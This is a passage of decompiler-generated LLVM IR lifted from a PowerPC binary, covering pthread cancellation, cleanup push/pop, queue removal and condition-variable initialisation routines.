  br i1 %v0_10014c28, label %dec_label_pc_10014c34, label %dec_label_pc_10014c2c

dec_label_pc_10014c2c:                            ; preds = %dec_label_pc_10014c14
  %v0_10014c2c = load i32, i32* %r9.global-to-local, align 4
  %v3_10014c2c = icmp eq i32 %v0_10014c2c, 0
  store i1 %v3_10014c2c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014c2c, label %dec_label_pc_10014c40, label %dec_label_pc_10014c34

dec_label_pc_10014c34:                            ; preds = %dec_label_pc_10014c2c, %dec_label_pc_10014c14
  %v0_10014c34 = load i32, i32* @r29, align 4
  store i32 %v0_10014c34, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10014c3c.1033 to i32), i32* @lr, align 4
  %v0_10014c38 = call i32 @__pthread_unlock()
  store i32 %v0_10014c38, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10014ca0

dec_label_pc_10014c40:                            ; preds = %dec_label_pc_10014c2c
  %v0_10014c40 = load i32, i32* @r31, align 4
  %v1_10014c40 = add i32 %v0_10014c40, 444
  %v2_10014c40 = inttoptr i32 %v1_10014c40 to i32*
  %v3_10014c40 = load i32, i32* %v2_10014c40, align 4
  store i32 %v3_10014c40, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  %v1_10014c48 = add i32 %v0_10014c40, 20
  %v2_10014c48 = inttoptr i32 %v1_10014c48 to i32*
  %v3_10014c48 = load i32, i32* %v2_10014c48, align 4
  store i32 %v3_10014c48, i32* %r28.global-to-local, align 4
  %v3_10014c4c = icmp eq i32 %v3_10014c40, 0
  store i1 %v3_10014c4c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014c4c, label %dec_label_pc_10014c70, label %dec_label_pc_10014c54

dec_label_pc_10014c54:                            ; preds = %dec_label_pc_10014c40
  %v1_10014c54 = inttoptr i32 %v3_10014c40 to i32*
  %v2_10014c54 = load i32, i32* %v1_10014c54, align 4
  store i32 %v2_10014c54, i32* %r3.global-to-local, align 4
  %v1_10014c5c = add i32 %v3_10014c40, 4
  %v2_10014c5c = inttoptr i32 %v1_10014c5c to i32*
  %v3_10014c5c = load i32, i32* %v2_10014c5c, align 4
  store i32 %v3_10014c5c, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_10014c5c)
  %v1_10014c68 = trunc i32 %v2_10014c54 to i8
  %v2_10014c68 = load i32, i32* @r31, align 4
  %v3_10014c68 = add i32 %v2_10014c68, 440
  %v4_10014c68 = inttoptr i32 %v3_10014c68 to i8*
  store i8 %v1_10014c68, i8* %v4_10014c68, align 1
  %v0_10014c6c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10014c6c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10014c70

dec_label_pc_10014c70:                            ; preds = %dec_label_pc_10014c40, %dec_label_pc_10014c54
  %v0_10014c70 = load i32, i32* @r29, align 4
  store i32 %v0_10014c70, i32* @r3, align 4
  store i32 268520568, i32* @lr, align 4
  %v0_10014c74 = call i32 @__pthread_unlock()
  store i32 %v0_10014c74, i32* %r3.global-to-local, align 4
  %v0_10014c78 = load i32, i32* %r30.global-to-local, align 4
  %v3_10014c78 = icmp eq i32 %v0_10014c78, 0
  store i1 %v3_10014c78, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014c78, label %dec_label_pc_10014c8c, label %dec_label_pc_10014c80

dec_label_pc_10014c80:                            ; preds = %dec_label_pc_10014c70
  %v0_10014c80 = load i32, i32* @r31, align 4
  store i32 %v0_10014c80, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10014c88.1034 to i32), i32* @lr, align 4
  %v0_10014c84 = call i32 @__pthread_restart_new()
  store i32 %v0_10014c84, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10014ca0

dec_label_pc_10014c8c:                            ; preds = %dec_label_pc_10014c70
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v0_10014c90 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10014c90, i32* %r3.global-to-local, align 4
  %v3_10014c94 = load i32, i32* @global_var_100450e8.993, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10014c9c.1035 to i32), i32* @lr, align 4
  %v2_10014c98 = call i32 @kill(i32 %v0_10014c90, i32 %v3_10014c94)
  store i32 %v2_10014c98, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10014ca0

dec_label_pc_10014ca0:                            ; preds = %dec_label_pc_10014c8c, %dec_label_pc_10014c34, %dec_label_pc_10014c80, %dec_label_pc_10014c04
  %storemerge = phi i32 [ 3, %dec_label_pc_10014c04 ], [ 0, %dec_label_pc_10014c80 ], [ 0, %dec_label_pc_10014c34 ], [ 0, %dec_label_pc_10014c8c ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_10014c40, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10014bec, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r30.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10014ca0, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10014c70, { 1, 0 }
}

define i32 @pthread_setcancelstate(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  %v0_10014cb8 = load i32, i32* @lr, align 4
  store i32 %v0_10014cb8, i32* %r0.global-to-local, align 4
  %v3_10014cbc = icmp ugt i8 %arg1, 1
  store i32 %tmp, i32* %r11.global-to-local, align 4
  %v0_10014cc4 = load i32, i32* @r2, align 4
  store i32 %v0_10014cc4, i32* %r9.global-to-local, align 4
  br i1 %v3_10014cbc, label %dec_label_pc_10014d18, label %dec_label_pc_10014cd4

dec_label_pc_10014cd4:                            ; preds = %entry
  %v3_10014cd4 = icmp eq i32 %arg2, 0
  br i1 %v3_10014cd4, label %dec_label_pc_10014ce4, label %dec_label_pc_10014cdc

dec_label_pc_10014cdc:                            ; preds = %dec_label_pc_10014cd4
  %v1_10014cdc = add i32 %v0_10014cc4, 64
  %v2_10014cdc = inttoptr i32 %v1_10014cdc to i8*
  %v3_10014cdc = load i8, i8* %v2_10014cdc, align 1
  %v4_10014cdc = zext i8 %v3_10014cdc to i32
  store i32 %v4_10014cdc, i32* %r0.global-to-local, align 4
  %v2_10014ce0 = inttoptr i32 %arg2 to i32*
  store i32 %v4_10014cdc, i32* %v2_10014ce0, align 4
  %v0_10014ce4.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_10014ce8.pre = load i32, i32* %r11.global-to-local, align 4
  %extract.t4 = trunc i32 %v0_10014ce8.pre to i8
  br label %dec_label_pc_10014ce4

dec_label_pc_10014ce4:                            ; preds = %dec_label_pc_10014cd4, %dec_label_pc_10014cdc
  %v0_10014ce8.off0 = phi i8 [ %arg1, %dec_label_pc_10014cd4 ], [ %extract.t4, %dec_label_pc_10014cdc ]
  %v2_10014ce8 = phi i32 [ %v0_10014cc4, %dec_label_pc_10014cd4 ], [ %v0_10014ce4.pre, %dec_label_pc_10014cdc ]
  %v1_10014ce4 = add i32 %v2_10014ce8, 66
  %v2_10014ce4 = inttoptr i32 %v1_10014ce4 to i8*
  %v3_10014ce4 = load i8, i8* %v2_10014ce4, align 1
  %v4_10014ce4 = zext i8 %v3_10014ce4 to i32
  store i32 %v4_10014ce4, i32* %r0.global-to-local, align 4
  %v3_10014ce8 = add i32 %v2_10014ce8, 64
  %v4_10014ce8 = inttoptr i32 %v3_10014ce8 to i8*
  store i8 %v0_10014ce8.off0, i8* %v4_10014ce8, align 1
  %v0_10014cec = load i32, i32* %r0.global-to-local, align 4
  %v3_10014cec = icmp eq i32 %v0_10014cec, 0
  br i1 %v3_10014cec, label %dec_label_pc_10014d14, label %dec_label_pc_10014cf4

dec_label_pc_10014cf4:                            ; preds = %dec_label_pc_10014ce4
  %v0_10014cf4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014cf4 = add i32 %v0_10014cf4, 64
  %v2_10014cf4 = inttoptr i32 %v1_10014cf4 to i32*
  %v3_10014cf4 = load i32, i32* %v2_10014cf4, align 4
  store i32 %v3_10014cf4, i32* %r0.global-to-local, align 4
  store i32 65536, i32* %r9.global-to-local, align 4
  %v1_10014cfc = call i32 @__asm_rlwinm(i32 %v3_10014cf4, i32 0, i32 0, i32 15)
  store i32 %v1_10014cfc, i32* %r0.global-to-local, align 4
  %v4_10014d00 = icmp eq i32 %v1_10014cfc, 65536
  br i1 %v4_10014d00, label %dec_label_pc_10014d08, label %dec_label_pc_10014d14

dec_label_pc_10014d08:                            ; preds = %dec_label_pc_10014cf4
  %v0_10014d10 = call i32 @__pthread_do_exit()
  br label %dec_label_pc_10014d14

dec_label_pc_10014d14:                            ; preds = %dec_label_pc_10014cf4, %dec_label_pc_10014ce4, %dec_label_pc_10014d08
  br label %dec_label_pc_10014d18

dec_label_pc_10014d18:                            ; preds = %entry, %dec_label_pc_10014d14
  %v0_10014d24 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_10014d14 ]
  store i32 %v0_10014cb8, i32* %r0.global-to-local, align 4
  ret i32 %v0_10014d24

; uselistorder directives
  uselistorder label %dec_label_pc_10014d18, { 1, 0 }
  uselistorder label %dec_label_pc_10014d14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10014ce4, { 1, 0 }
}

define i32 @__pthread_perform_cleanup(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10014d34 = load i32, i32* @r2, align 4
  store i32 %v0_10014d34, i32* %r30.global-to-local, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  %v1_10014d40 = add i32 %v0_10014d34, 60
  br label %dec_label_pc_10014d60

dec_label_pc_10014d4c:                            ; preds = %dec_label_pc_10014d60
  %v1_10014d4c = inttoptr i32 %storemerge to i32*
  %v2_10014d4c = load i32, i32* %v1_10014d4c, align 4
  %v1_10014d50 = add i32 %storemerge, 4
  %v2_10014d50 = inttoptr i32 %v1_10014d50 to i32*
  %v3_10014d50 = load i32, i32* %v2_10014d50, align 4
  store i32 %v3_10014d50, i32* %r3.global-to-local, align 4
  call void @__pseudo_call(i32 %v2_10014d4c)
  %v0_10014d5c = load i32, i32* @r31, align 4
  %v1_10014d5c = add i32 %v0_10014d5c, 12
  %v1_10014d64.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10014d60

dec_label_pc_10014d60:                            ; preds = %entry, %dec_label_pc_10014d4c
  %v1_10014d64 = phi i32 [ %arg1, %entry ], [ %v1_10014d64.pre, %dec_label_pc_10014d4c ]
  %storemerge.in.in = phi i32 [ %v1_10014d40, %entry ], [ %v1_10014d5c, %dec_label_pc_10014d4c ]
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @r31, align 4
  %v3_10014d60 = icmp eq i32 %storemerge, 0
  %tmp5 = icmp ule i32 %storemerge, %v1_10014d64
  %or.cond = or i1 %tmp5, %v3_10014d60
  br i1 %or.cond, label %dec_label_pc_10014d6c, label %dec_label_pc_10014d4c

dec_label_pc_10014d6c:                            ; preds = %dec_label_pc_10014d60
  %v0_10014d6c = load i32, i32* %r30.global-to-local, align 4
  %v1_10014d6c = add i32 %v0_10014d6c, 372
  %v2_10014d6c = inttoptr i32 %v1_10014d6c to i32*
  %v3_10014d6c = load i32, i32* %v2_10014d6c, align 4
  %v3_10014d70 = icmp eq i32 %v3_10014d6c, 0
  br i1 %v3_10014d70, label %dec_label_pc_10014d6c.dec_label_pc_10014d7c_crit_edge, label %dec_label_pc_10014d78

dec_label_pc_10014d6c.dec_label_pc_10014d7c_crit_edge: ; preds = %dec_label_pc_10014d6c
  %v0_10014d8c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10014d7c

dec_label_pc_10014d78:                            ; preds = %dec_label_pc_10014d6c
  store i32 268520828, i32* @lr, align 4
  %v0_10014d78 = call i32 @__rpc_thread_destroy()
  store i32 %v0_10014d78, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10014d7c

dec_label_pc_10014d7c:                            ; preds = %dec_label_pc_10014d6c.dec_label_pc_10014d7c_crit_edge, %dec_label_pc_10014d78
  %v0_10014d8c = phi i32 [ %v0_10014d8c.pre, %dec_label_pc_10014d6c.dec_label_pc_10014d7c_crit_edge ], [ %v0_10014d78, %dec_label_pc_10014d78 ]
  ret i32 %v0_10014d8c

; uselistorder directives
  uselistorder i32 %storemerge, { 2, 3, 4, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10014d7c, { 1, 0 }
  uselistorder label %dec_label_pc_10014d60, { 1, 0 }
}

define i32 @__pthread_cleanup_pop_restore() local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r9.global-to-local = alloca i32, align 4
  %v0_10014d98 = load i32, i32* @r4, align 4
  %v3_10014d98 = icmp eq i32 %v0_10014d98, 0
  store i1 %v3_10014d98, i1* %cr7_eq.global-to-local, align 1
  %v0_10014da0 = load i32, i32* @r3, align 4
  store i32 %v0_10014da0, i32* @r31, align 4
  %v0_10014da8 = load i32, i32* @r2, align 4
  store i32 %v0_10014da8, i32* @r30, align 4
  br i1 %v3_10014d98, label %dec_label_pc_10014dc0, label %dec_label_pc_10014db0

dec_label_pc_10014db0:                            ; preds = %entry
  %v1_10014dbc = call i32 @unknown_0()
  store i32 %v1_10014dbc, i32* @r3, align 4
  %v0_10014dc0.pre = load i32, i32* @r31, align 4
  %v0_10014dc4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10014dc0

dec_label_pc_10014dc0:                            ; preds = %entry, %dec_label_pc_10014db0
  %v1_10014dc8 = phi i32 [ %v0_10014da8, %entry ], [ %v0_10014dc4.pre, %dec_label_pc_10014db0 ]
  %v0_10014dc0 = phi i32 [ %v0_10014da0, %entry ], [ %v0_10014dc0.pre, %dec_label_pc_10014db0 ]
  %v1_10014dc0 = add i32 %v0_10014dc0, 12
  %v2_10014dc0 = inttoptr i32 %v1_10014dc0 to i32*
  %v3_10014dc0 = load i32, i32* %v2_10014dc0, align 4
  %v1_10014dc4 = add i32 %v1_10014dc8, 66
  %v2_10014dc4 = inttoptr i32 %v1_10014dc4 to i8*
  %v3_10014dc4 = load i8, i8* %v2_10014dc4, align 1
  %v4_10014dc4 = zext i8 %v3_10014dc4 to i32
  store i32 %v4_10014dc4, i32* %r9.global-to-local, align 4
  %v2_10014dc8 = add i32 %v1_10014dc8, 60
  %v3_10014dc8 = inttoptr i32 %v2_10014dc8 to i32*
  store i32 %v3_10014dc0, i32* %v3_10014dc8, align 4
  %v0_10014dcc = load i32, i32* %r9.global-to-local, align 4
  %v3_10014dcc = icmp eq i32 %v0_10014dcc, 0
  store i1 %v3_10014dcc, i1* %cr7_eq.global-to-local, align 1
  %v0_10014dd0 = load i32, i32* @r31, align 4
  %v1_10014dd0 = add i32 %v0_10014dd0, 8
  %v2_10014dd0 = inttoptr i32 %v1_10014dd0 to i32*
  %v3_10014dd0 = load i32, i32* %v2_10014dd0, align 4
  %v1_10014dd4 = trunc i32 %v3_10014dd0 to i8
  %v2_10014dd4 = load i32, i32* @r30, align 4
  %v3_10014dd4 = add i32 %v2_10014dd4, 65
  %v4_10014dd4 = inttoptr i32 %v3_10014dd4 to i8*
  store i8 %v1_10014dd4, i8* %v4_10014dd4, align 1
  %v0_10014dd8 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10014dd8, label %dec_label_pc_10014dfc, label %dec_label_pc_10014ddc

dec_label_pc_10014ddc:                            ; preds = %dec_label_pc_10014dc0
  %v0_10014ddc = load i32, i32* @r30, align 4
  %v1_10014ddc = add i32 %v0_10014ddc, 64
  %v2_10014ddc = inttoptr i32 %v1_10014ddc to i32*
  %v3_10014ddc = load i32, i32* %v2_10014ddc, align 4
  store i32 65536, i32* %r9.global-to-local, align 4
  %v1_10014de4 = call i32 @__asm_rlwinm(i32 %v3_10014ddc, i32 0, i32 0, i32 15)
  %v4_10014de8 = icmp eq i32 %v1_10014de4, 65536
  store i1 %v4_10014de8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10014de8, label %dec_label_pc_10014df0, label %dec_label_pc_10014dfc

dec_label_pc_10014df0:                            ; preds = %dec_label_pc_10014ddc
  %v0_10014df8 = call i32 @__pthread_do_exit()
  store i32 %v0_10014df8, i32* @r3, align 4
  br label %dec_label_pc_10014dfc

dec_label_pc_10014dfc:                            ; preds = %dec_label_pc_10014ddc, %dec_label_pc_10014dc0, %dec_label_pc_10014df0
  %v0_10014e0c = load i32, i32* @r3, align 4
  ret i32 %v0_10014e0c

; uselistorder directives
  uselistorder label %dec_label_pc_10014dfc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10014dc0, { 1, 0 }
}

define i32 @__pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v0_10014e14 = load i32, i32* @r2, align 4
  store i32 %v0_10014e14, i32* %r9.global-to-local, align 4
  %v2_10014e18 = add i32 %tmp, 4
  %v3_10014e18 = inttoptr i32 %v2_10014e18 to i32*
  store i32 %arg3, i32* %v3_10014e18, align 4
  %v0_10014e1c = load i32, i32* @r2, align 4
  %v1_10014e1c = add i32 %v0_10014e1c, 65
  %v2_10014e1c = inttoptr i32 %v1_10014e1c to i8*
  %v3_10014e1c = load i8, i8* %v2_10014e1c, align 1
  %v4_10014e1c = zext i8 %v3_10014e1c to i32
  store i32 %v4_10014e1c, i32* %r0.global-to-local, align 4
  %v2_10014e20 = add i32 %tmp, 8
  %v3_10014e20 = inttoptr i32 %v2_10014e20 to i32*
  store i32 %v4_10014e1c, i32* %v3_10014e20, align 4
  %v0_10014e24 = load i32, i32* @r2, align 4
  %v1_10014e24 = add i32 %v0_10014e24, 60
  %v2_10014e24 = inttoptr i32 %v1_10014e24 to i32*
  %v3_10014e24 = load i32, i32* %v2_10014e24, align 4
  store i32 %v3_10014e24, i32* %r0.global-to-local, align 4
  %v3_10014e28 = icmp eq i32 %v3_10014e24, 0
  %v2_10014e2c = add i32 %tmp, 12
  %v3_10014e2c = inttoptr i32 %v2_10014e2c to i32*
  store i32 %v3_10014e24, i32* %v3_10014e2c, align 4
  %v1_10014e30 = load i32, i32* %r0.global-to-local, align 4
  %v2_10014e30 = icmp ult i32 %tmp, %v1_10014e30
  %brmerge = or i1 %v3_10014e28, %v2_10014e30
  br i1 %brmerge, label %dec_label_pc_10014e44, label %dec_label_pc_10014e3c

dec_label_pc_10014e3c:                            ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %v3_10014e2c, align 4
  br label %dec_label_pc_10014e44

dec_label_pc_10014e44:                            ; preds = %entry, %dec_label_pc_10014e3c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10014e48 = load i32, i32* %r9.global-to-local, align 4
  %v2_10014e48 = add i32 %v1_10014e48, 60
  %v3_10014e48 = inttoptr i32 %v2_10014e48 to i32*
  store i32 %tmp, i32* %v3_10014e48, align 4
  %v0_10014e4c = load i32, i32* %r0.global-to-local, align 4
  %v1_10014e4c = trunc i32 %v0_10014e4c to i8
  %v2_10014e4c = load i32, i32* %r9.global-to-local, align 4
  %v3_10014e4c = add i32 %v2_10014e4c, 65
  %v4_10014e4c = inttoptr i32 %v3_10014e4c to i8*
  store i8 %v1_10014e4c, i8* %v4_10014e4c, align 1
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 3, 2, 5, 1, 4, 0 }
  uselistorder label %dec_label_pc_10014e44, { 1, 0 }
}

define i32 @_pthread_cleanup_pop(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v3_10014e5c = icmp eq i32 %arg2, 0
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v0_10014e6c = load i32, i32* @r2, align 4
  store i32 %v0_10014e6c, i32* @r30, align 4
  br i1 %v3_10014e5c, label %dec_label_pc_10014e84, label %dec_label_pc_10014e74

dec_label_pc_10014e74:                            ; preds = %entry
  %v1_10014e78 = add i32 %tmp, 4
  %v2_10014e78 = inttoptr i32 %v1_10014e78 to i32*
  %v3_10014e78 = load i32, i32* %v2_10014e78, align 4
  store i32 %v3_10014e78, i32* %r3.global-to-local, align 4
  %v1_10014e80 = call i32 @unknown_0()
  store i32 %v1_10014e80, i32* %r3.global-to-local, align 4
  %v0_10014e84.pre = load i32, i32* %r31.global-to-local, align 4
  %v1_10014e88.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10014e84

dec_label_pc_10014e84:                            ; preds = %entry, %dec_label_pc_10014e74
  %v1_10014e88 = phi i32 [ %v0_10014e6c, %entry ], [ %v1_10014e88.pre, %dec_label_pc_10014e74 ]
  %v0_10014e84 = phi i32 [ %tmp, %entry ], [ %v0_10014e84.pre, %dec_label_pc_10014e74 ]
  %v1_10014e84 = add i32 %v0_10014e84, 12
  %v2_10014e84 = inttoptr i32 %v1_10014e84 to i32*
  %v3_10014e84 = load i32, i32* %v2_10014e84, align 4
  %v2_10014e88 = add i32 %v1_10014e88, 60
  %v3_10014e88 = inttoptr i32 %v2_10014e88 to i32*
  store i32 %v3_10014e84, i32* %v3_10014e88, align 4
  %v0_10014e9c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10014e9c

; uselistorder directives
  uselistorder i32 %tmp, { 2, 1, 0, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10014e84, { 1, 0 }
}

define i32 @_pthread_cleanup_push(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v0_10014ea4 = load i32, i32* @r2, align 4
  store i32 %v0_10014ea4, i32* @r9, align 4
  %v2_10014ea8 = add i32 %tmp, 4
  %v3_10014ea8 = inttoptr i32 %v2_10014ea8 to i32*
  store i32 %arg3, i32* %v3_10014ea8, align 4
  %v0_10014eac = load i32, i32* @r2, align 4
  %v1_10014eac = add i32 %v0_10014eac, 60
  %v2_10014eac = inttoptr i32 %v1_10014eac to i32*
  %v3_10014eac = load i32, i32* %v2_10014eac, align 4
  store i32 %v3_10014eac, i32* %r0.global-to-local, align 4
  %v3_10014eb0 = icmp eq i32 %v3_10014eac, 0
  %v2_10014eb4 = add i32 %tmp, 12
  %v3_10014eb4 = inttoptr i32 %v2_10014eb4 to i32*
  store i32 %v3_10014eac, i32* %v3_10014eb4, align 4
  %v1_10014eb8 = load i32, i32* %r0.global-to-local, align 4
  %v2_10014eb8 = icmp ult i32 %tmp, %v1_10014eb8
  %brmerge = or i1 %v3_10014eb0, %v2_10014eb8
  br i1 %brmerge, label %dec_label_pc_10014ecc, label %dec_label_pc_10014ec4

dec_label_pc_10014ec4:                            ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %v3_10014eb4, align 4
  br label %dec_label_pc_10014ecc

dec_label_pc_10014ecc:                            ; preds = %entry, %dec_label_pc_10014ec4
  %v1_10014ecc = load i32, i32* @r9, align 4
  %v2_10014ecc = add i32 %v1_10014ecc, 60
  %v3_10014ecc = inttoptr i32 %v2_10014ecc to i32*
  store i32 %tmp, i32* %v3_10014ecc, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 4, 3, 2, 0 }
  uselistorder label %dec_label_pc_10014ecc, { 1, 0 }
}

define i32 @pthread_testcancel(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10014ee0 = load i32, i32* @r2, align 4
  %v1_10014ee0 = add i32 %v0_10014ee0, 66
  %v2_10014ee0 = inttoptr i32 %v1_10014ee0 to i8*
  %v3_10014ee0 = load i8, i8* %v2_10014ee0, align 1
  %v3_10014ee4 = icmp eq i8 %v3_10014ee0, 0
  br i1 %v3_10014ee4, label %dec_label_pc_10014f04, label %dec_label_pc_10014eec

dec_label_pc_10014eec:                            ; preds = %entry
  %v1_10014eec = add i32 %v0_10014ee0, 64
  %v2_10014eec = inttoptr i32 %v1_10014eec to i8*
  %v3_10014eec = load i8, i8* %v2_10014eec, align 1
  %v3_10014ef0 = icmp eq i8 %v3_10014eec, 0
  br i1 %v3_10014ef0, label %dec_label_pc_10014ef8, label %dec_label_pc_10014f04

dec_label_pc_10014ef8:                            ; preds = %dec_label_pc_10014eec
  %v0_10014f00 = call i32 @__pthread_do_exit()
  br label %dec_label_pc_10014f04

dec_label_pc_10014f04:                            ; preds = %dec_label_pc_10014eec, %entry, %dec_label_pc_10014ef8
  %.0 = phi i32 [ undef, %entry ], [ %v0_10014f00, %dec_label_pc_10014ef8 ], [ undef, %dec_label_pc_10014eec ]
  ret i32 %.0

; uselistorder directives
  uselistorder label %dec_label_pc_10014f04, { 2, 0, 1 }
}

define i32 @enqueue(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10014f14 = add i32 %arg1, 24
  %v2_10014f14 = inttoptr i32 %v1_10014f14 to i32*
  %v3_10014f14 = load i32, i32* %v2_10014f14, align 4
  store i32 %v3_10014f14, i32* @r11, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @remove_from_queue(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10014f6c.pre = load i32, i32* @r3, align 4
  %v1_10014f6c21 = inttoptr i32 %v0_10014f6c.pre to i32*
  %v2_10014f6c22 = load i32, i32* %v1_10014f6c21, align 4
  store i32 %v2_10014f6c22, i32* %r9.global-to-local, align 4
  %v3_10014f7025 = icmp eq i32 %v2_10014f6c22, 0
  br i1 %v3_10014f7025, label %dec_label_pc_10014f7c, label %dec_label_pc_10014f4c

dec_label_pc_10014f4c:                            ; preds = %entry, %dec_label_pc_10014f68
  %v2_10014f6c.pn = phi i32 [ %v2_10014f6c, %dec_label_pc_10014f68 ], [ %v2_10014f6c22, %entry ]
  %v2_10014f6c30 = phi i32 [ %v2_10014f6c, %dec_label_pc_10014f68 ], [ %v2_10014f6c22, %entry ]
  %v1_10014f6c29 = phi i32* [ %v1_10014f6c, %dec_label_pc_10014f68 ], [ %v1_10014f6c21, %entry ]
  %v4_10014f7435 = icmp eq i32 %v2_10014f6c.pn, %arg1
  %v1_10014f50 = add i32 %v2_10014f6c30, 8
  br i1 %v4_10014f7435, label %dec_label_pc_10014f50, label %dec_label_pc_10014f68

dec_label_pc_10014f50:                            ; preds = %dec_label_pc_10014f4c
  %v2_10014f50 = inttoptr i32 %v1_10014f50 to i32*
  %v3_10014f50 = load i32, i32* %v2_10014f50, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  store i32 %v3_10014f50, i32* %v1_10014f6c29, align 4
  %v1_10014f60 = load i32, i32* %r9.global-to-local, align 4
  %v2_10014f60 = add i32 %v1_10014f60, 8
  %v3_10014f60 = inttoptr i32 %v2_10014f60 to i32*
  store i32 0, i32* %v3_10014f60, align 4
  %v0_10014f80.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10014f80

dec_label_pc_10014f68:                            ; preds = %dec_label_pc_10014f4c
  %v1_10014f6c = inttoptr i32 %v1_10014f50 to i32*
  %v2_10014f6c = load i32, i32* %v1_10014f6c, align 4
  store i32 %v2_10014f6c, i32* %r9.global-to-local, align 4
  %v3_10014f70 = icmp eq i32 %v2_10014f6c, 0
  br i1 %v3_10014f70, label %dec_label_pc_10014f7c, label %dec_label_pc_10014f4c

dec_label_pc_10014f7c:                            ; preds = %dec_label_pc_10014f68, %entry
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10014f80

dec_label_pc_10014f80:                            ; preds = %dec_label_pc_10014f50, %dec_label_pc_10014f7c
  %v0_10014f80 = phi i32 [ %v0_10014f80.pre, %dec_label_pc_10014f50 ], [ 0, %dec_label_pc_10014f7c ]
  ret i32 %v0_10014f80

; uselistorder directives
  uselistorder i32 %v2_10014f6c, { 2, 3, 0, 1 }
  uselistorder i32* %v1_10014f6c, { 1, 0 }
  uselistorder i32 %v1_10014f50, { 1, 0 }
  uselistorder i32 %v2_10014f6c22, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10014f80, { 1, 0 }
  uselistorder label %dec_label_pc_10014f4c, { 1, 0 }
}

define i32 @pthread_cond_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10014f8c = add i32 %tmp, 8
  %v3_10014f8c = inttoptr i32 %v2_10014f8c to i32*
  store i32 0, i32* %v3_10014f8c, align 4
  %v0_10014f90 = load i32, i32* %r0.global-to-local, align 4
